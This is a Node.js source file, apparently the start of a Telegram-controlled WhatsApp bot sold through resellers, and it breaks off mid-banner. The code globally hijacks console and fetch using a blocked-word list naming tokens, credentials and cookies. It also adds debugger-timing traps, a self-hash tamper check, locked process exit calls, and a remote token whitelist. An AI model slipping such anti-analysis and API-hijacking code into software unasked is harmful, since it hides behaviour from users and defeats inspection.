//Base By @Luctadvorisme
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

(function () {
  try {
    const origLog = console.log.bind(console);
    const origWarn = console.warn.bind(console);
    const origError = console.error.bind(console);
    const blockedWords = [
      'fetch', 'axios', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database', 'token', 'apikey', 'key',
      'secret', 'raw.githubusercontent', 'cdn.discordapp', 'dropbox', 'pastebin', 'session', 'cookie', 'auth',
      'login', 'credentials', 'ip:', 'url:', 'endpoint', 'request', 'response'
    ];
    function detectSuspiciousAccess(...args) {
      try {
        const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').toLowerCase();
        if (blockedWords.some(word => msg.includes(word))) {
          origLog('\x1b[31m[Proteksi] Database Tidak Bisa Diambil !\x1b[0m');
          return true;
        }
      } catch (_) {}
      return false;
    }
    console.log = (...args) => {
      if (!detectSuspiciousAccess(...args)) origLog(...args);
    };
    console.warn = (...args) => {
      if (!detectSuspiciousAccess(...args)) origWarn(...args);
    };
    console.error = (...args) => {
      if (!detectSuspiciousAccess(...args)) origError(...args);
    };
    if (typeof fetch === 'function') {
      const origFetch = fetch;
      globalThis.fetch = async (...args) => {
        const url = String(args[0] || '').toLowerCase();
        if (blockedWords.some(w => url.includes(w))) {
          origLog('\x1b[31m[Proteksi] Database Tidak Bisa Diambil !\x1b[0m');
          throw new Error('Akses fetch terdeteksi mencurigakan dan diblokir.');
        }
        return origFetch(...args);
      };
    }

    if (typeof XMLHttpRequest !== 'undefined') {
      const origOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...rest) {
        if (typeof url === 'string' && blockedWords.some(w => url.toLowerCase().includes(w))) {
          origLog('\x1b[31m[Proteksi] Database Tidak Bisa Diambil !\x1b[0m');
          throw new Error('mencurigakan diblokir.');
        }
        return origOpen.call(this, method, url, ...rest);
      };
    }
  } catch (err) {
    console.error('[Proteksi] Error sistem proteksi:', err);
  }
})();

const databaseUrl = 'https://raw.githubusercontent.com/anaksholehnih/wape/refs/heads/main/tokens.json';
const thumbnailUrl = "https://f.top4top.io/p_379991v2t1.jpg";
const thumbnailUrl2 = "https://e.top4top.io/p_37990x6ef1.jpg";
 
const thumbnailVideo = "https://e.top4top.io/m_37824hfqm1.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Luctadvorisme 
  Version: 25.0.0
  Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Luctadvorisme
  Version: 25.0.0
  Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Luctadvorisme
  Version: 25.0.0
  Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @Luctadvorisme
  Version: 25.0.0
  Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
